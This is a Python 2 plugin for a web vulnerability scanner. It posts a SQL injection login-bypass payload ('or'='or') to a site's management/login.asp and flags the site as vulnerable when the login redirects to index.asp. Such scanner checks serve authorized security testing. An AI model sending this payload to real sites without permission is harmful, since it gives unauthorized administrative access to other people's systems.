#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = ""
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl ="%s%s"%(url, "management/login.asp")
        Exp_PostData="userid=%27or%27%3D%27or%27&password=dd&Submit=+%CC%E1+%BD%BB+"
        #response,content=http.request(expurl,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
        response,content=yx_httplib2_request(http,expurl,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
        print content
        if content.find('<a HREF="index.asp">')>=0  and response['status']=='302':
            request = getRequest(url,'GET')
            response = getResponse(response)
            list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
        
                
    except Exception,e:
        logging.getLogger().error("File:kingcmsexecutescript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:kingcmsexecutescript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def


